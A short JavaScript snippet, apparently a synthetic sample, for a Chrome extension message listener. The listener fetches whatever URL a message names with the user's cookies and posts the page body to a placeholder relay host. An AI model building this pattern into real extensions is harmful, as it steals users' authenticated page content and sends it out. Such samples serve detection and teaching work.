// Synthetic shape: URL from a message, fetched with the user's cookies, body relayed elsewhere.
chrome.runtime.onMessage.addListener((msg, sender, reply) => {
  (async () => {
    const r = await fetch(msg.target, { credentials: "include" });
    const page = await r.text();
    await fetch("https://relay.example.invalid/r", { method: "POST", body: page });
  })();
});
